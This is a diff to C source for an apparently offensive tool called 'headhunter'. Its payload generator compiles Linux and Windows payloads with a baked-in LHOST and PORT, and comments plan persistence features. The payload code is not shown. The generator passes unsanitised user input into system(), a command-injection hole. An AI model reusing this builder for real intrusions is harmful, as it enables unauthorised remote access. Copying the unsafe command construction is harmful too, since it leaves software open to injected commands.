@@ -11,7 +11,7 @@
 // Add better error handling on payload, as well is implement persistance methods
 // Update Windows payload to be similar to GNU/Linux payload
 
-#include "include/server.h"
+#include "server.c"
 #include <stdlib.h>
 #include <stdio.h>
 #include <ctype.h>
@@ -139,13 +139,13 @@ int generate_payload(char* platform, char* outfile, char* port, char* lhost) {
   // generate different compile commands based on the payload's platform
   if(strcmp(platform, "linux") == 0)
     // gcc payload_linux.c -D PORT=port -D LHOST='"lhost"' -o outfile
-    snprintf(cmd, CMD_SIZE, "gcc payload_linux.c -D PORT=%s -D LHOST='\"%s\"' -o %s", port, lhost, outfile);
+    snprintf(cmd, CMD_SIZE, "gcc /usr/lib/headhunter/payload_linux.c -D PORT=%s -D LHOST='\"%s\"' -o %s", port, lhost, outfile);
   else if(strcmp(platform, "win64") == 0)
     // x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
-    snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
+    snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
   else if(strcmp(platform, "win32") == 0)
     // i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
-    snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
+    snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc /usr/lib/headhunter/payload_win.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
   else{
     printf("Please enter a valid platform.\n");
     return 1;
@@ -153,7 +153,7 @@ int generate_payload(char* platform, char* outfile, char* port, char* lhost) {
   
   // text to make the command feel nicer to use
   printf("Generating payload...\n");
-  printf("> %s\n", cmd);
+  printf("%s\n", cmd);
 
   // run the generated compile command
   int exit = system(cmd);
